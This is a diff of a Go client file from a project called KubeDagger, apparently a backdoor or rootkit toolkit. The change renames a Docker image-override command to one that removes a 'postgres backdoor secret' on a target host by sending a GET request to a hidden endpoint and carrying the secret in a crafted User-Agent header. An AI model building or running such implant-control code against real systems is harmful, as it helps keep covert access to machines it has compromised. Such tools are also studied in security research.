@@ -14,7 +14,7 @@ See the License for the specific language governing permissions and
 limitations under the License.
 */
 
-package docker
+package postgres
 
 import (
 	"io/ioutil"
@@ -23,19 +23,19 @@ import (
 
 	"github.com/sirupsen/logrus"
 
-	"github.com/yasindce1998/KubeDagger/cmd/KubeDagger-client/run/utils"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/utils"
 )
 
-// SendDelImageOverrideRequest sends a request to remove a Docker image override on the target system
-func SendDelImageOverrideRequest(target string, from string) error {
+// SendDelPostgresRoleRequest sends a request to remove a postgres backdoor secret on the target system
+func SendDelPostgresRoleRequest(target string, secret string) error {
 	client := &http.Client{}
 
-	req, err := http.NewRequest("GET", target+"/del_doc_img", nil)
+	req, err := http.NewRequest("GET", target+"/del_pg_role", nil)
 	if err != nil {
 		logrus.Fatalln(err)
 	}
 
-	req.Header.Set("User-Agent", buildDelAgent(from))
+	req.Header.Set("User-Agent", buildDelUserAgent(secret))
 
 	b, err := httputil.DumpRequest(req, true)
 	logrus.Debugf("\n%s", utils.CleanupHost(string(b)))
